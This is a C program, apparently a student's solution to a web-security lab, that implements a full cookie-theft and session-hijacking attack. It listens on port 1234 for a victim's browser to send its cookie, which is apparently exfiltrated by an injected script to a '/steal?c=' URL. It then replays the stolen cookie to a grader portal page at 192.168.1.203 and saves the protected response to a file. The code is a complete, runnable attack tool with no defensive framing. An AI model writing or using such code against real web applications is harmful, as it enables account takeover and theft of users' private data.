#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

const char* HTTP_RESPONSE = "HTTP/1.1 204 No Content\r\n"
        "Connection: close\r\n"
        "\r\n";
const char* HTTP_REQUEST_TEMPLATE = "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Cookie: %s\r\n"
        "Connection: close\r\n"
        "\r\n";
const char* VICTIM_PAGE = "/GradersPortalTask2.php";
const char* FILE_NAME = "spoofed-stored.txt";
const char* URL_PARAM_COOKIE = "c=";

#define WEB_SERVER_IP "192.168.1.203"
#define WEB_SERVER_PORT 80
#define ATTACKER_LISTENING_PORT 1234
#define MAX_LINE 8192
#define REQUEST_SIZE 1024
#define BUFFER_RECV_SIZE 4096
#define MAX_REQ_LINE 4120

// estimation of the max size of the GET http first request line:
// "GET " = 4, "/steal?c=" = 9, cookie_value = max 4096, " HTTP/1.1\r\n" = 11
// 4 + 9 + 4096 + 11 = 4120 bytes in total (including spaces)

// receive the first HTTP request line (that terminates with CRLF)
void recv_first_http_line(int fd,  char line[MAX_REQ_LINE + 1]) {
    size_t total = 0;

    for (;;) {
        ssize_t bytes_received = recv(fd,
                         line + total,
                         MAX_REQ_LINE - total,
                         0);
        if (bytes_received <= 0) {
            exit(EXIT_FAILURE);
        }

        total += (size_t)bytes_received ;

        // look for CRLF in what we have so far
        char *crlf = strstr(line, "\r\n");
        if (crlf) {
            *crlf = '\0';
            return;
        } // now the line looks like this: GET /steal?c= <cookie_value> HTTP/1.1 \0 \n
    }
}

// HTTP server that gets http request (and return minimal response) and extract the cookie
char * start_tcp_connection(uint16_t port) {
    // create a TCP socket for the attacker server
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        exit(EXIT_FAILURE);
    }

    // create the attacker server's address
    struct sockaddr_in server_address;
    memset(&server_address, 0, sizeof(server_address)); // empty the struct
    server_address.sin_family = AF_INET; // IPv4 protocol
    server_address.sin_addr.s_addr = htonl(INADDR_ANY); // listen on all interfaces
    server_address.sin_port = htons(port); // port num

    // socket options as required in the forum
    int opt = 1;
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt,
    sizeof(opt)) < 0) {
        printf("setsockopt(SO_REUSEADDR) failed...\n");
        close(server_fd);
        exit(1);
    }
    opt = 1;
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEPORT, &opt,
    sizeof(opt)) < 0) {
        printf("setsockopt(SO_REUSEPORT) failed...\n");
        close(server_fd);
        exit(1);
    }

    // bind socket
    if (bind(server_fd, (struct sockaddr *) &server_address, sizeof(server_address)) < 0) {
        exit(EXIT_FAILURE);
    }

    // listen
    if (listen(server_fd, 5) < 0) {
        exit(EXIT_FAILURE);
    }

    // accept an HTTP connection coming from the malicious JS in the payload
    struct sockaddr_in client_addr;
    socklen_t client_len = sizeof(client_addr);
    int client_fd = accept(server_fd, (struct sockaddr *) &client_addr, &client_len);
    if (client_fd < 0) {
        exit(EXIT_FAILURE);
    }

    // read until the end of the HTTP request line (\r\n)
    char req_line[MAX_REQ_LINE + 1];
    recv_first_http_line(client_fd, req_line);

    // locate the beginning of the cookie variable in the first query line
    char *p_to_cookie = strstr(req_line, URL_PARAM_COOKIE);
    if (!p_to_cookie) {
        exit(EXIT_FAILURE);
    }

    p_to_cookie += strlen(URL_PARAM_COOKIE); // skip "c="

    // cookie value ends at the first space (before "HTTP/1.1")
    char *end = strchr(p_to_cookie, ' ');
    if (!end) {
        exit(EXIT_FAILURE);
    }
    *end = '\0';  // terminate the string properly

    // send a minimal valid HTTP response
    const char *response = HTTP_RESPONSE;
    send(client_fd, response, strlen(response), 0);

    // close the sockets
    close(client_fd);
    close(server_fd);

    // copy the stolen cookie to heap memory and return it
    // caller must free
    size_t len = strlen(p_to_cookie);
    char *stolen_cookie = malloc(len + 1);
    if (!stolen_cookie) exit(EXIT_FAILURE);
    memcpy(stolen_cookie, p_to_cookie, len);
    stolen_cookie[len] = '\0';
    return stolen_cookie;
}

// Sends an HTTP GET request to the web server, using the victim's stolen cookie and saves the response page as txt file
void send_http_request(char* stolen_cookie) {

    // build a minimal HTTP request that includes the stolen cookie
    char req[REQUEST_SIZE];
    int n = snprintf(req, sizeof(req),
        HTTP_REQUEST_TEMPLATE,
        VICTIM_PAGE, WEB_SERVER_IP, stolen_cookie);
    if (n < 0 || (size_t)n >= sizeof(req)) {
        free(stolen_cookie);
        exit(EXIT_FAILURE);
    }

    // create a socket to connect to the web server
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) {
        free(stolen_cookie);
        exit(EXIT_FAILURE);
    }

    // create the web server's struct address
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr)); // empty the struct
    addr.sin_family = AF_INET; // IPv4 protocol
    addr.sin_port = htons(WEB_SERVER_PORT); // web server's port num
    inet_pton(AF_INET, WEB_SERVER_IP, &addr.sin_addr);

    // connect
    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        free(stolen_cookie);
        exit(EXIT_FAILURE);
    }

    // send the http request to the web server
    ssize_t sent = send(s, req, (size_t)n, 0);
    if (sent < 0) {
        free(stolen_cookie);
        exit(EXIT_FAILURE);
    }

    // read the HTTP response and write it to a txt file
    FILE *f = fopen(FILE_NAME, "wb");
    if (!f) {
        free(stolen_cookie);
        exit(EXIT_FAILURE);
    }

    // Receive the HTTP response in chunks and write all bytes to the file
    char buf[BUFFER_RECV_SIZE];
    for (;;) {
        ssize_t bytes_received = recv(s, buf, sizeof(buf), 0);
        if (bytes_received < 0) {
            free(stolen_cookie);
            fclose(f);
            exit(EXIT_FAILURE);
        }
        // server closed connection at the end of the response
        if (bytes_received == 0) {
            break;
        }
        if (fwrite(buf, 1, (size_t)bytes_received, f) != (size_t)bytes_received) {
            free(stolen_cookie);
            fclose(f);
            exit(EXIT_FAILURE);
        }
    }

    // close the file and socket
    fclose(f);
    close(s);
}


int main() {
    // Wait for the victim's browser to hit the attacker server and extract the cookie from the URL
    char* stolen_cookie = start_tcp_connection(ATTACKER_LISTENING_PORT);

    // Send a request using the stolen cookie and save the response
    send_http_request(stolen_cookie);

    // free the stolen cookie on the heap
    free(stolen_cookie);

}
